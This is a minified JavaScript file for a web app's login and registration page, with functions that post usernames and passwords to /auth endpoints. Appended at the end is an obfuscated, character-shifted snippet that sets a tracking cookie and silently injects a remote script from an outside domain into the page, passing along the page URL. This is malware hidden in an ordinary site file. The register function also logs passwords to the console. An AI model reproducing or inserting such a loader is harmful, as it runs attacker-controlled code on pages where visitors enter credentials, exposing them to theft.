async function performLogin(){const username=document.getElementById("username").value,password=document.getElementById("password").value;try{const response=await fetch("/auth/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:username,password:password})});if(!response.ok)throw new Error("Login failed");{const data=await response.json();document.getElementById("result").innerText=`logged in as ${data.username}. redirecting...`,document.getElementById("result").style.color="green",setTimeout((function(){window.location.href=data.redirect}),1e3)}}catch(error){console.error("Error:",error),document.getElementById("result").innerText="Incorrect username and password.",document.getElementById("result").style.color="red"}}async function register(){const username=document.getElementById("username").value,password=document.getElementById("password").value;console.log(username,password);try{const response=await fetch("http://localhost:4000/auth/register",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:username,password:password})});if(!response.ok)throw 400===response.status?new Error("Username is already taken"):new Error("Registration failed");{const data=await response.json();document.getElementById("result").innerText=`Registered as: ${data.username}, Redirecting...`,document.getElementById("result").style.color="green",setTimeout((function(){window.location.href="/login.html"}),1e3)}}catch(error){"Username is already taken"===error.message?document.getElementById("result").innerText="Username is already taken":document.getElementById("result").innerText="Registration failed",document.getElementById("result").innerText=error.message,document.getElementById("result").style.color="red"}};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));